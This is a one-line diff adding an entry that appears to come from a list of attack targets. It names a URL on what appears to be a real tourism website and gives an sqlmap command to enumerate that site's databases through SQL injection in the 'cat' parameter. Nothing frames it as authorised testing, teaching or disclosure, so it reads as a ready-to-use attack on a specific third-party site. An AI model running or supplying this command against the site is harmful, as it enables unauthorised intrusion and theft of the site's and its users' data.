@@ -1,0 +1,1 @@
+http://www.hermanusthingstodo.com/shopping.php?cat=109 (GET)  # sqlmap.py -u http://www.hermanusthingstodo.com/shopping.php?cat=109 --dbs
